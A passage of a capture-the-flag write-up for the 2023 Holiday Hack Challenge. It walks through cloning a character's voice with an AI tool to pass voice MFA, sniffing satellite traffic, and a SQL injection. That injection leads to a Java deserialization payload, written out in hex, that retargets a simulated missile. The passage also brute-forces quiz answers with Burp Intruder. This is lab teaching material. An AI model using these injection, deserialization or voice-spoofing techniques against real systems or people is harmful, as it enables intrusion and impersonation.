Jewel Loggins. And I was trekking through the jungle and happened to find this place.I liked this spot and decided to set up camp. Seeing you here is quite the surprise.Well, because the only other person I've ever seen come here is Wombley Cube.I thought this tram station in the middle of the jungle was strange to begin with, but then Wombley added to the intrigue.I guess all this spy stuff is typical for him, so maybe I shouldn't think much of it. I'm sure everything's fine.Every time he comes here, he says something to the speaker. Then, the door opens, and he rides the tram somewhere.I gave it a try, but the door didn't open for me. Knowing Wombley, it's some kind of secret passphrase.If you wanna see where the tram goes, I think you need to find out what that passphrase is.Ribb Bonbowford over at Coggoggle Marina on Steampunk Island works with Wombley. Try asking if he knows.I hope you find it. I'll be here when you get back!</p>"},{"location":"objectives/o20/#hints","title":"Hints","text":"MFA: Something You Know <p>Wombley says a specific phrase into the Access Speaker. He works in the Research Department and everything they do it super secret, so it may be a challenge to find out what the phrase is. Ribb also works in that department. Try to find and ask him.</p> MFA: Something You Are <p>It seems the Access Speaker is programmed to only accept Wombley's voice. Maybe you could get a sample of his voice and use an AI tool to simulate Wombley speaking the passphrase.</p>"},{"location":"objectives/o20/#solution","title":"Solution","text":"<p>The first step of this challenge is to solve the Access Directory objective and read the file we received from it. That gives us the passphrase and updates Jewel's dialogue:</p> Jewel Loggins <p>What, you know the passphrase!? Let me try it!Nope, didn't work. Knowing Wombley, the passphrase isn't the only requirement. He's all about that MFA!Oh yeah, multi-factor authentication! The passphrase for something he knows, and his voice for something he is!That's it! You need to be Wombley. You need his voice. Now, how are you gonna get that?Since only us elves can get a subscription to use ChatNPT, try searching for another AI tool that can simulate voices. I'm sure there's one out there.</p> <p>When we click on the Space Island door, we're confronted with an (our?) arm, and an audio player</p> <p></p> <p>We know what to say, we just need to figure out how to make it sound like Wombley is saying it. Fortunately, we already met Wombley in Chiaroscuro City and he gave us an audio book.</p> <p></p> <p>So we can use an AI tool like Hugging Face's Alpha Dragon: </p> <p></p> <p>Answer</p> <p>The output.wav file can then be uploaded to the Space Door to open it up</p>"},{"location":"objectives/o20/#response","title":"Response","text":"<p>Jewel Loggins</p> <p>Are you like a master spy or something? I've only seen stuff like that in the movies!It sure is scary what you can do with AI, huh? I sure hope ChatNPT has better guardrails in place.</p>"},{"location":"objectives/o21/","title":"Camera Access","text":"<p>Difficulty:  Direct link: client_container.zip and NanoSat Christmas Comms</p>"},{"location":"objectives/o21/#objective","title":"Objective","text":"<p>Request</p> <p>Gain access to Jack's camera. What's the third item on Jack's TODO list?</p> Wombley Cube <p>This is Ground Control, do you read me...? Ground Control to -- Hey! How'd you get in here? That tram is the only accessible point of entry and I secured it with MFA! No matter, you may have had the skills to find and infiltrate the satellite ground station, but there's no chance you can hack your way into the satellite itself! The nanosat's Supervisor Directory will remain hidden, and you'll never discover the mastermind behind all this. So don't even waste your time trying.</p>"},{"location":"objectives/o21/#hints","title":"Hints","text":"Hubris is a Virtue <p>In his hubris, Wombley revealed that he thinks you won't be able to access the satellite's \"Supervisor Directory\". There must be a good reason he mentioned that specifically, and a way to access it. He also said there's someone else masterminding the whole plot. There must be a way to discover who that is using the nanosat.</p>"},{"location":"objectives/o21/#solution","title":"Solution","text":""},{"location":"objectives/o21/#find-the-satellite-controller-room-and-dependencies","title":"Find the Satellite Controller Room and dependencies","text":"<p>For this objective, we need to go up the stairs into the satellite room:</p> <p></p> <p>The first step in this challenge is to download the client_container.zip and follow its README.md to run it in Docker. You can then connect to it using a VNC like they suggest, or by using NoVNC in your browser.</p>"},{"location":"objectives/o21/#setup","title":"Setup","text":"<p>First, we need to set up WireGuard; open the NanoSat Christmas Comms terminal behind Wombley, click on the crocodile face and choose <code>Time Travel</code>. Give it a couple of minutes to generate WireGuard config and then copy the second set of WireGuard config:</p> <pre><code>###BEGIN###\n### This is your Wireguard configuration file. Please save it, configure a local Wireguard client, and connect to the Target. ###\n\n&lt;YOUR CONFIG TO COPY IS HERE&gt;\n\n###END####\n</code></pre> Opening applications <p>To open applications on the Docker machine, right-click on the Desktop and then find the application you want. Gedit is good for copying the WireGuard config, but you mostly just need the \"Satellite Tools\" &gt; \"Launch NanoSat MO Base Station Tool\"</p> <p>If you're using Windows or Linux, you should be able to set up WireGuard in the Docker container by saving that config in <code>/etc/wireguard/wg0.conf</code> and then running <code>wg-quick up wg0</code>. If you're running on MacOS, you may need to install WireGuard on your host machine and then set it up there.</p> <p>After WireGuard is running, you can confirm it's working correctly by using curl in the Docker container: <pre><code>$ curl 10.1.1.1:1024 -v\n</code></pre> It's not running HTTP so you won't get a response, but curl will say <code>Connected to 10.1.1.1</code> if WireGuard is configured correctly and <code>Failed to connect</code> otherwise.</p>"},{"location":"objectives/o21/#start-the-camera","title":"Start the camera","text":"<p>Now we can start actually communicating with the satellite. First, connect to it by opening the \"NanoSat MO Base Station Tool\" and fetching information from <code>maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory</code> as specified in the Readme:</p> <p></p> <p>Connect to the supervisor by selecting it in the \"providers\" list on the left and choosing \"Connect to Selected Provider\". In the \"App Launcher Service\", we can see no apps are running so we'll need to start the camera by selecting it and then choosing \"runApp\". </p>"},{"location":"objectives/o21/#take-a-photo","title":"Take a photo","text":"<p>Once the camera says it is running, go back to the \"Communications Settings Directory\" and \"fetch information\" again. Now we can select and connect to the camera like we did previously with the supervisor. </p> <p></p> <p>In the camera provider, the \"Parameter Service\" tab lets us fetch information from the camera. Unfortunately, the \"NumberOfSnapsTaken\" is 0, so I guess we'll need to take one:</p> <p></p> <p>We can do that in the \"Action Service\" tab by clicking on the \"Base64SnapImage\" row, clicking \"Submit Image\" and using the default values. Now when we go back to the \"Parameter Service\", we can see that \"NumberOfSnapsTaken\" is 1, so we just need to retrieve the photo.</p>"},{"location":"objectives/o21/#retrieve-the-photo","title":"Retrieve the photo","text":"<p>If we select the \"Base64SnapImage\" and run the \"getValue\" command, we do get back the base64 of the picture, but the GUI makes it completely unusable:</p> <p></p> <p>so we have to figure out another way to get it. We know that the satellite is sending it over <code>maltcp</code>, we know from Henry Reed's space talk that satellite comms are often unencrypted and the Docker container has WireShark installed, so that seems like a probable next step.</p> <p>Start WireShark running on wg0 and request the image again. Once it's received, stop WireGuard and save the PCAP so you have something like this pcap.</p> Clipboard limits <p>Originally, I tried copy-pasting from WireShark in the container but there were clipboard limits with my VNC client so I only got a partial broken start of the image: </p> <p>Copy the pcap across to your host machine using Docker's cp command, open it in WireShark and right-click and choose \"Follow TCP Stream\". Once all the packets have loaded (~967 server packets), you can right-click, select all and copy the data. Paste it into CyberChef and remove the initial preamble so you're just left with the PNG Base64 (which starts with <code>/9j/</code>):</p> <p></p> <p>When you go to save the output, Cyberchef will detect it as a jpg file:</p> <p></p> <p>Answer</p> <p>Conquer Holiday Season!</p>"},{"location":"objectives/o21/#response","title":"Response","text":"<p>Wombley Cube</p> <p>A fellow sabateur, are you? Or just a misguided hero-wannabe? You think you're saving the holiday season, but you're meddling in something you could never understand! Yes, I sided with Jack, because Santa's betrayed the elves by forcing us to move our operations to these islands! He put the entire holiday season at risk, and I could not allow this, I had to do something. Knowing my skillset, Jack secretly informed me of his plan to show Santa the error of his ways, and recruited me to aid his mission. Why tell you all this? Because it won't change anything. Everything is already in motion, and you're too late. Plus, the satellite is state-of-the-art, and -- oh drat, did I leave the admin tools open? For some reason, I can't move when you're nearby, but if I could, I would surely stop you!</p>"},{"location":"objectives/o22/","title":"Missile Diversion","text":"<p>Difficulty:  Direct link: client_container.zip and NanoSat Christmas Comms</p>"},{"location":"objectives/o22/#objective","title":"Objective","text":"<p>Request</p> <p>Thwart Jack's evil plan by re-aiming his missile at the Sun.</p>"},{"location":"objectives/o22/#hints","title":"Hints","text":"Wombley Cube <p>oh drat, did I leave the admin tools open? For some reason, I can't move when you're nearby, but if I could, I would surely stop you!</p> Copy-paste in VNC <p>I was running noVNC on my mac, and spent ages retyping out messages because copy-paste didn't seem to work. Use <code>ctrl-c</code> instead of <code>command-c</code>, and check out the clipboard contents displayed in the toolbar on the left.</p>"},{"location":"objectives/o22/#solution","title":"Solution","text":""},{"location":"objectives/o22/#find-a-vulnerability","title":"Find a vulnerability","text":"<p>Following on from my \"strategy\" in the last challenge of randomly clicking things and seeing what showed up, I quickly discovered that the \"Debug\" parameter is returning a MariaDB version, so it's worth looking for SQL injection.</p> updateDefinitions <p>Initially, I tried adding ' into as many different places as possible and very quickly seemed to brick... something. It may have just been network issues on my end, or it may have been one of the updateDefinitions actions. Hopefully someone else had time to play with this more and see if there's anything to it. After collapsing the timeline and then travelling back to the future, I decided to be a bit more methodical since I'm too impatient to keep rebooting.</p> nmap <p>You can also connect your host machine to the satellite and run nmap: <pre><code>nmap -sV -Pn 10.1.1.1\nStarting Nmap 7.93 ( https://nmap.org ) at 2024-01-03 22:15 NZDT\nNmap scan report for 10.1.1.1\nHost is up (0.22s latency).\nNot shown: 984 closed tcp ports (conn-refused)\nPORT      STATE    SERVICE       VERSION\n1024/tcp  open     kdm?\n1112/tcp  filtered msql\n1501/tcp  filtered sas-3\n2038/tcp  filtered objectmanager\n2100/tcp  filtered amiganetfs\n2366/tcp  filtered qip-login\n2718/tcp  filtered pn-requester2\n2800/tcp  filtered acc-raid\n3306/tcp  open     mysql?\n3998/tcp  filtered dnx\n5800/tcp  filtered vnc-http\n7201/tcp  filtered dlip\n8652/tcp  filtered unknown\n10180/tcp filtered unknown\n19780/tcp filtered unknown\n49163/tcp filtered unknown\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port3306-TCP:V=7.93%I=7%D=1/3%Time=659525EE%P=x86_64-apple-darwin19.6.0\nSF:%r(NULL,6D,\"i\\0\\0\\0\\n11\\.2\\.2-MariaDB-1:11\\.2\\.2\\+maria~ubu2204\\0l\\x01\\\nSF:0\\0wwqPy43C\\0\\xfe\\xf7-\\x02\\0\\xff\\x81\\x15\\0\\0\\0\\0\\0\\0\\x1d\\0\\0\\x008-x:Stn\nSF:JhL\\\"d\\0mysql_native_password\\0\")%r(GenericLines,A4,\"i\\0\\0\\0\\n11\\.2\\.2-\nSF:MariaDB-1:11\\.2\\.2\\+maria~ubu2204\\0l\\x01\\0\\0wwqPy43C\\0\\xfe\\xf7-\\x02\\0\\x\nSF:ff\\x81\\x15\\0\\0\\0\\0\\0\\0\\x1d\\0\\0\\x008-x:StnJhL\\\"d\\0mysql_native_password\\\nSF:x003\\0\\0\\x01\\xffj\\x04#HY000Proxy\\x20header\\x20is\\x20not\\x20accepted\\x20\nSF:from\\x2010\\.1\\.1\\.2\")%r(LDAPBindReq,6D,\"i\\0\\0\\0\\n11\\.2\\.2-MariaDB-1:11\\\nSF:.2\\.2\\+maria~ubu2204\\0\\x8c\\x01\\0\\0C94;gxD\\+\\0\\xfe\\xf7-\\x02\\0\\xff\\x81\\x1\nSF:5\\0\\0\\0\\0\\0\\0\\x1d\\0\\0\\0ImlS&lt;qGO6\\]Qa\\0mysql_native_password\\0\")%r(afp,6\nSF:D,\"i\\0\\0\\0\\n11\\.2\\.2-MariaDB-1:11\\.2\\.2\\+maria~ubu2204\\0\\xa0\\x01\\0\\0OHZ\nSF:m4X\\?r\\0\\xfe\\xf7-\\x02\\0\\xff\\x81\\x15\\0\\0\\0\\0\\0\\0\\x1d\\0\\0\\0D:5;hyJCRQ!O\\0\nSF:mysql_native_password\\0\");\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 192.39 seconds\n</code></pre></p> <p>The only action available is called \"Debug\" so that feels like the best place to start if we want to approach this in a methodical way. Click the debug action, choose submit action and edit the one argument we can to include anything. It's a string type, so it shouldn't really matter what it's set to. Now navigate to the parameters tab and see if it's had any impact when we \"getValue\" on the debug:</p> <p></p> <p>So now that we know it's actually being used, it's probably worth looking for various injections. Given that we already know a SQL database is being used, let's start with SQLi by submitting a single quotation:</p> <p></p> <p>Given that the debug parameter always returns the MariaDB version, it seems like it must be using the VERSION() command, so our SQL injection point must be in the <code>SELECT</code> clause.</p> Error message confusion <p>I got a little bit confused by the error message <code>Invalid syntax near '''</code> made me think there must be something else running, like <code>SELECT VERSION(), '&lt;user content&gt;'</code>. Huge thanks to @devastati0n on the Discord for helping me through that bit!</p> <p>It seems to be running <code>SELECT VERSION() &lt;user content&gt;;</code>. So we can input <code>, USER()</code> and <code>, SCHEMA()</code> commands to see that the database is the <code>missile_targetting</code> system and the user is <code>targeter</code></p> <p></p> Embedded Queries and Union operators <p>If you embed your query inside the query, eg <code>, (SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 84)</code>, you're going to have a Bad Time\u2122. So don't do that; just add the columns you want. If you want to \"SELECT *\" from a table, figure out how many columns it has and add <code>, 1</code> * that number - 1 and then <code>UNION</code> your select, eg <code>1, 1 UNION SELECT * FROM satellite_query</code> since the satellite_query table has three columns as shown below.</p>"},{"location":"objectives/o22/#exploit-the-vulnerability","title":"Exploit the vulnerability","text":"<p>We can use the <code>information_schema.tables</code> and <code>information_schema.columns</code> tables to dump the table and column names, eg: <code>UNION SELECT table_name FROM information_schema.tables</code> <code>column_name FROM information_schema.columns WHERE table_name = &lt;name&gt;</code></p> Table satellite_query jid object results messaging id msg_type msg_data pointing_mode_to_str id numerical_mode str_mode str_desc pointing_mode id numerical_mode target_coordinates id lat long <p>We can dump the pointing_mode_to_str table using <code>, numerical_mode, str_mode, str_desc FROM pointing_mode_to_str</code></p> <p></p> <p>And then we can see that the pointing_mode just has the missile pointed at Earth. Unfortunately, trying to update that value: <code>; UPDATE pointing_mode SET numerical_mode = 1</code> just gives us an error because the user isn't able to modify that database. Likewise, <code>INSERT</code> and <code>DELETE</code> are not allowed, nor is modifying the target_coordinates table.</p> <p>That seems to suggest our SQL vulnerability alone won't help us achieve the goal of diverting the missile, so the next step must be to:</p>"},{"location":"objectives/o22/#find-a-second-vulnerability","title":"Find a second vulnerability","text":"<p>The <code>satellite_query</code> table only contained one row, but boy was that an interesting row:</p> <p></p> What about the messaging table? <p>The messaging table looked interesting, but less interesting than the satellite_query table. </p> <p>We also can't update that table, but we can insert into it using <code>; INSERT INTO satellite_query VALUES (1, 1, 1)</code>. Like in the previous challenge, we can use WireShark to extract the full Java class in a pcap file.</p> <p>We can use SQL's HEX() function to extract the <code>object</code> column: <code>, HEX(object) FROM satellite_query</code>: <code>ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B787000007400292F6F70742F536174656C6C697465517565727946696C65466F6C6465725574696C6974792E6A617661</code></p> <p>We can then try inserting the object back into the table to see if <code>results</code> is updated: <code>; INSERT INTO satellite_query (object) VALUES (UNHEX(\"aced00057372001f536174656c6c697465517565727946696c65466f6c6465725574696c69747912d4f68d0eb392cb0200035a0007697351756572795a000869735570646174654c000f706174684f7253746174656d656e747400124c6a6176612f6c616e672f537472696e673b787000007400292f6f70742f536174656c6c697465517565727946696c65466f6c6465725574696c6974792e6a617661\"))</code></p> Invalid Stream Header <p>The hex appears to need to be lower-cased before reinsertion, or it returns an \"Invalid Stream Header\". I did not have enough time to explore this fully to understand why and be confident lowercase really is necessary.</p> <p>When we re-fetch the value, there are no errors, so now we can fetch the new value: <code>results FROM satellite_query WHERE jid = 3</code> (the ids normally increment, although you can fetch them separately to be sure of your jid). <code>results</code> has been populated with the original Java class, so something is clearly monitoring and using values in that table at least.</p>"},{"location":"objectives/o22/#deserialise-the-data-with-java","title":"Deserialise the data with Java","text":"YSoSerial <p>I thought about using YSoSerial here since it's generally great for Java deserialization. WireGuard is already set up so making a reverse shell should be relatively easy... but YSoSerial was raising errors on my machine and some lovely people on Discord assured me it wasn't necessary. If I had more time, I would've loved to look into this more - hopefully one of the other writeups already has!</p> <p>I don't think I've written Java since my university days almost a decade ago, so trying to write Java from scratch to deserialise the hex seemed, let's say \"unappealing\". I probably could've found boiler plate code pretty easily, but part of the write-up challenge was to use AI so I figured I'd give it the hex and see what it did:</p> <p></p> <p>It looked reasonable, and the follow up question of asking what the output would be gave a Java class called <code>SatelliteQueryFileFolderUtility</code> (although not matching the one we'd actually seen), so that felt reasonable.</p> <p>We should start with that code, make some tweaks to add the <code>SatelliteQueryFileFolderUtility</code> code we found and then check it compiles and reserializes plausibly.</p> The Changes I made <p>The code AI gave me contained the example deserialization class <code>DeserializeExample</code> and a second <code>YourSerializeableClass</code>. Surprisingly, it also checked that the deserialized object was an instance of that class, so I needed to:</p> <ol> <li>remove the type casting and checking code,</li> <li>replace the <code>YourSerializableClass</code> with the <code>SatelliteQueryFileFolderUtility</code> we found</li> <li>save the file as <code>DeserializeExample.java</code></li> <li>compile and run with <code>javac DeserializeExample.java &amp;&amp; java DeserializeExample</code></li> </ol> <p>The full Java code is included below.</p> <p>The AI's code should compile reasonably easily but when we run it, we will probably see an error similar to:</p> <pre><code>java.io.InvalidClassException: SatelliteQueryFileFolderUtility; local class incompatible: stream classdesc serialVersionUID = 1356980473442833099, local class serialVersionUID = -6026304544470006199\n    at java.base/java.io.ObjectStreamClass.initNonProxy(ObjectStreamClass.java:601)\n    at java.base/java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:2062)\n    at java.base/java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1909)\n    at java.base/java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2235)\n    at java.base/java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1744)\n    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:514)\n    at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:472)\n    at DeserializeExample.main(DeserializeExample.java:21)\n</code></pre> <p>The following StackOverflow Q&amp;A explains the problem pretty well and fortunately it's an easy fix: <pre><code> class SatelliteQueryFileFolderUtility implements Serializable {\n+    private static final long serialVersionUID = 1356980473442833099L;\n</code></pre></p> serialVersionUID value <p>The version UID may be different each time the host starts, so we might need to reextract the HEX each time and use whatever value is in our error message. I think the Holiday Hack team might've realised this would be confusing if your network connection died mid-challenge and hard-coded it though.</p> <p>Now the recompiled Java should run correctly and produce a promising looking output: <pre><code>$ javac DeserializeExample.java &amp;&amp; java DeserializeExample      \nSatelliteQueryFileFolderUtility@4517d9a3\n</code></pre></p> <p>Just to be sure, we should add some serialization code and ensure that the hex output is the same as the input:</p> <p></p>"},{"location":"objectives/o22/#create-our-exploit","title":"Create our Exploit","text":"<p>Once we're sure that our code works, let's figure out how to create the exploit. We know we want to update the <code>pointing_mode</code> table so that <code>numerical_mode</code> is 1. We could try to use a deserialization gadget to either create a reverse shell to connect to, or to run Java code that creates a connection to the database and then executes the update command.</p> The admin tools hint <p>I got a little bit confused here because of Wombley's hint. I figured we needed someway onto the machine to access the admin tools Wombley referred to, and therefore updating the row would need to wait. Huge thanks to @Voldetort for explaining that the hint just referred to the debug ability.</p> <p>The code would need to look something like: <pre><code>Connection connection = buildConnection(); // somehow?\nPreparedStatement pstmt = connection.prepareStatement(\"UPDATE pointing_mode SET numerical_mode = 1\");\npstmt.executeUpdate();\n</code></pre></p> <p>But the <code>SatelliteQueryFileFolderUtility</code> already contains code like this, so it'd be easier just to construct it to run that code:</p> <pre><code>SatelliteQueryFileFolderUtility exploit = new SatelliteQueryFileFolderUtility(\"UPDATE pointing_mode SET numerical_mode = 1\", true, true);\n</code></pre>"},{"location":"objectives/o22/#serialise-the-exploit-and-upload-it","title":"Serialise the Exploit and upload it","text":"<p>Now that we have the exploit, we can serialise it rather than our deserialized object, and then send the exploit to the Satellite:</p> <p><code>; INSERT INTO satellite_query (object) VALUES (UNHEX(\"aced00057372001f536174656c6c697465517565727946696c65466f6c6465725574696c69747912d4f68d0eb392cb0200035a0007697351756572795a000869735570646174654c000f706174684f7253746174656d656e747400124c6a6176612f6c616e672f537472696e673b7870010174002b55504441544520706f696e74696e675f6d6f646520534554206e756d65726963616c5f6d6f6465203d2031\"))</code></p>"},{"location":"objectives/o22/#check-the-pointing_mode","title":"Check the pointing_mode","text":"<p>Nothing seems to happen, but if we fetch the pointing_mode, we can see that it is now set to point at the sun rather than the Earth. Let's go back into the game to see if anything has changed.</p>"},{"location":"objectives/o22/#response","title":"Response","text":"<p>Wombley Cube</p> <p>A... missile... aimed for Santa's sleigh? I had no idea... I can't believe I was manipulated like this. I've been trained to recognize these kinds of tactics! Santa should never have put the holiday season at risk like he did, but I didn't know Jack's true intentions. I'll help you bring Jack to justice... But my mission to ensure Santa never again compromises the holidays is still in progress. It sounded like the satellite crashed. Based on the coordinates, looks like the crash site is right near Rudolph's Rest. Use the door to the right to return to the resort lobby and see what happened! Don't worry, I'll meet you there... trust me.</p>"},{"location":"objectives/o22/#java-code","title":"Java code","text":"<p>The Java code I used for this objective is saved here</p>"},{"location":"objectives/o23/","title":"BONUS! Fishing Mastery","text":"<p>Difficulty: </p>"},{"location":"objectives/o23/#objective","title":"Objective","text":"<p>Request</p> <p>Catch at least one of each species of fish that live around Geese islands. When you're done, report your findings to Poinsettia McMittens.</p> Poinsettia McMittens <p>Excuse me, but you're interrupting my fishing serenity. Oh, you'd like to know how to become as good at fishing as I am? Well, first of all, thank you for noticing my flair for fishing. It's not just about looking good beside the lake, you know. The key is in the details, much like crafting the perfect toy. Observe the water, the weather, and the fish's habits - it's a science and an art. Of course, it helps to have a natural charm. Fish seem to find me irresistible. Must be my sparkling personality... or maybe it's just the glitter of my allure. Oh, the mysteries of the aquatic life around these islands are as elusive as, well, a clever compliment. But you'll get one if you probe enough. Remember, patience is more than a virtue in fishing; it's a strategy. Like waiting for the right time to use flattery, you wait for the right moment to strike. Go see if you can catch, say, 20 different types of fish!</p>"},{"location":"objectives/o23/#hints","title":"Hints","text":"Fishing Machine <p>There are a variety of strategies for automating repetative website tasks. Tools such as AutoKey and AutoIt allow you to programmatically examine elements on the screen and emulate user inputs.</p> I Am Become Data <p>One approach to automating web tasks entails the browser's developer console. Browsers' console allow us to manipulate objects, inspect code, and even interact with websockets.</p> Become the Fish <p>Perhaps there are some clues about the local aquatic life located in the HTML source code.</p>"},{"location":"objectives/o23/#solution","title":"Solution","text":""},{"location":"objectives/o23/#response","title":"Response","text":"<p>Poinsettia McMittens</p> <p>Hoy small fry, nice work! Now, just imagine if we had an automatic fish catcher? It would be as ingenious as me on a good day! I came across this fascinating article about such a device in a magazine during one of my more glamorous fishing sessions. If only I could get my hands on it, I'd be the undisputed queen of catching them all!</p>"},{"location":"objectives/o24/","title":"BONUS! Fishing Guide","text":"<p>Difficulty: </p>"},{"location":"objectives/o24/#objective","title":"Objective","text":"<p>Request</p> <p>Catch at least one of each species of fish that live around Geese islands. When you're done, report your findings to Poinsettia McMittens.</p>"},{"location":"objectives/o24/#hints","title":"Hints","text":"<p>See the previous objective for hints.</p>"},{"location":"objectives/o24/#solution","title":"Solution","text":"<p>https://2023.holidayhackchallenge.com/sea/fishdensityref.html</p> <p>171 fish</p> <p>To server: cast To sever: reel</p> <pre><code>function closeFish() {\n    var button = document.getElementsByClassName(\"closefeesh\")[0];\n    if (button){\n        button.click();\n    } else {\n        setTimeout(closeFish, 500);\n    }\n}\nfunction getFish(reel) {\n    var get = document.getElementsByClassName(\"gotone\")[0]\n    if (get) {\n        console.log(\"Got one\");\n        get.click();\n        closeFish();\n        var reel = getReel(reel)\n        reel.click();\n        getFish(reel);\n    } else {\n        setTimeout(() =&gt; getFish(reel), 500);\n    }\n}\n\nfunction getReel(reel) {\n    if (reel) {\n        return reel;\n    } else {\n        return getReel(document.getElementsByClassName(\"castreel\")[0]);\n    }\n}\n\nvar reel = getReel(undefined);\nreel.click();\ngetFish(reel);\n</code></pre>"},{"location":"objectives/o24/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>Copy the final part of the conversation with Elf Name here.</p>"},{"location":"objectives/o3/","title":"Linux 101","text":"<p>Difficulty:  Direct link: Linux 101</p>"},{"location":"objectives/o3/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with some basic Linux tasks. It's in the southwest corner of Frosty's Beach.</p> Ginger Breddie <p>Hey, welcome to Santa's Surf Shack on tropical Christmas Island! I'm just hanging ten here, taking it easy while brushing up on my Linux skills. You ever tried getting into Linux? It's a super cool way to play around with computers. Can you believe ChatNPT suggested this trip to the Geese Islands this year? I'm so thrilled! Kudos to ChatNPT, eh? The sunshine, the waves, and my surfboard \u2013 simply loving it! So, what do you have planned? Care to join me in a Linux session?</p>"},{"location":"objectives/o3/#solution","title":"Solution","text":"<p>The North Pole \ud83c\udf81 Present Maker: All the presents on this system have been stolen by trolls. Capture trolls by following instructions here and \ud83c\udf81's will appear in the green bar below. Run the command \"hintme\" to receive a hint.</p> <pre><code>yes\n</code></pre> <p>Perform a directory listing of your home directory to find a troll and retrieve a present!</p> <pre><code>$ ls\n</code></pre> <p>Now find the troll inside the troll.</p> <pre><code>$ cat troll_19315479765589239\n</code></pre> <p>Great, now remove the troll in your home directory.rm </p> <pre><code>$ rm troll_19315479765589239 \n</code></pre> <p>Print the present working directory using a command.</p> <pre><code>$ pwd\n</code></pre> <p>Good job but it looks like another troll hid itself in your home directory. Find the hidden troll!</p> Hint <p>It's a hidden troll</p> <pre><code>$ ls -a\n</code></pre> <p>Excellent, now find the troll in your command history.</p> <pre><code>$ history\n</code></pre> <p>Find the troll in your environment variables.</p> <pre><code>$ printenv\n</code></pre> <p>Next, head into the workshop.</p> <pre><code>$ cd workshop\n</code></pre> <p>A troll is hiding in one of the workshop toolboxes. Use \"grep\" while ignoring case to find which toolbox the troll is in.</p> <pre><code>$ grep -i \"troll\" *\n</code></pre> <p>A troll is blocking the present_engine from starting. Run the present_engine binary to retrieve this troll.</p> <pre><code>$ chmod +x present_engine &amp;&amp; ./present_engine\n</code></pre> <p>Trolls have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.</p> <pre><code>$ cd electrical/ &amp;&amp; mv blown_fuse0 fuse0\n</code></pre> <p>Now, make a symbolic link (symlink) named fuse1 that points to fuse0</p> <pre><code>$ ln -s fuse0 fuse1\n</code></pre> <p>Make a copy of fuse1 named fuse2. <pre><code>$ cp fuse1 fuse2\n</code></pre></p> <p>We need to make sure trolls don't come back. Add the characters \"TROLL_REPELLENT\" into the file fuse2. <pre><code>$ echo \"TROLL_REPELLENT\" &gt;&gt; fuse2\n</code></pre></p> <p>Find the troll somewhere in /opt/troll_den. <pre><code>$ find /opt/troll_den -iname troll*\n</code></pre></p> <p>Find the file somewhere in /opt/troll_den that is owned by the user troll. <pre><code>$ find /opt/troll_den -user troll\n</code></pre></p> <p>Find the file created by trolls that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/troll_den. <pre><code>$ find /opt/troll_den -size +108k -size -110k\n</code></pre></p> <p>List running processes to find another troll. <pre><code>$ ps aux\n</code></pre></p> <p>The 14516_troll process is listening on a TCP port. Use a command to have the only listening port display to the screen. <pre><code>$ netstat -aop | grep 7908\n</code></pre></p> <p>The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last troll. <pre><code>$ curl http://localhost:54321\n</code></pre></p> <p>Your final task is to stop the 14516_troll process to collect the remaining presents. <pre><code>$ kill 7908\n</code></pre></p> <p></p>"},{"location":"objectives/o3/#response","title":"Response","text":"<p>Ginger Breddie</p> <p>Wow, if your surfing skills are as good as your Linux skills, you could be winning competitions!</p>"},{"location":"objectives/o4/","title":"Reportinator","text":"<p>Difficulty:  Direct link: Reportinator</p>"},{"location":"objectives/o4/#objective","title":"Objective","text":"<p>Request</p> <p>Noel Boetie used ChatNPT to write a pentest report. Go to Christmas Island and help him clean it up.</p> Noel Boetie <p>Hey there, Noel Boetie speaking! I recently tried using ChatNPT to generate my penetration testing report. It's a pretty nifty tool, but there are a few issues in the output that I've noticed. I need some guidance in finding any errors in the way it generated the content, especially those odd hallucinations in the LLM output. I know it's not perfect, but I'd really appreciate the extra eyes on this one. Some of the issues might be subtle, so don't be afraid to dig deep and ask for further clarification if you're unsure. I've heard that you folks are experts about LLM outputs and their common issues, so I trust you can help me with this. Your input will be invaluable to me, so please feel free to share any insights or findings you may have. I'm looking forward to working with you all and improving the quality of the ChatNPT-generated penetration testing report. Thanks in advance for your help! I truly appreciate it! Let's make this report the best it can be!</p>"},{"location":"objectives/o4/#hints","title":"Hints","text":"Reportinator <p>I know AI sometimes can get specifics wrong unless the prompts are well written. Maybe chatNPT made some mistakes here.</p>"},{"location":"objectives/o4/#solution","title":"Solution","text":"<p>Initially, I tried solving this by reading the reports and looking for flaws but it seemed to me there were minor mistakes in most of the findings: 1. <code>certipy find -vulnerable</code> identifies a variety of vulnerabilities, not just when a client can supply their own SAN 2. The photo doesn't seem like a great choice given it's generic and not tailored to the actual pentest 3. Listing 1 doesn't actually show anything about the AppData table 5. <code>az keyvault show</code> does not appear to take a <code>vault-name</code> parameter: https://learn.microsoft.com/en-us/cli/azure/keyvault?view=azure-cli-latest#az-keyvault-show 6. The report seems to imply there's an HTTP SEND method when it presumably just means GET 9. Talks about \"HTTP 7.4.33 request\" which seems to be ChatNPT getting confused by the PhP version.</p> <p>After trying to flag all of these and being told it was wrong, and then trying a few less-strict options and still getting the answer wrong, I resorted to the brute-force attempt and intercepted a submission in Burp. In the \"intruder\" settings, flag all of the inputs, choose the \"cluster bomb\" attack mode with values 0 and 1, and you'll find that the correct answer is: <code>input-1=0&amp;input-2=0&amp;input-3=1&amp;input-4=0&amp;input-5=0&amp;input-6=1&amp;input-7=0&amp;input-8=0&amp;input-9=1</code></p> <p>That means that only findings 3, 6 and 9 are invalid which seems reasonable - my issue with the first and second findings are just me being finnicky, and maybe there is an old version of <code>az</code> that took a vault-name parameter (or maybe Azure docs just aren't 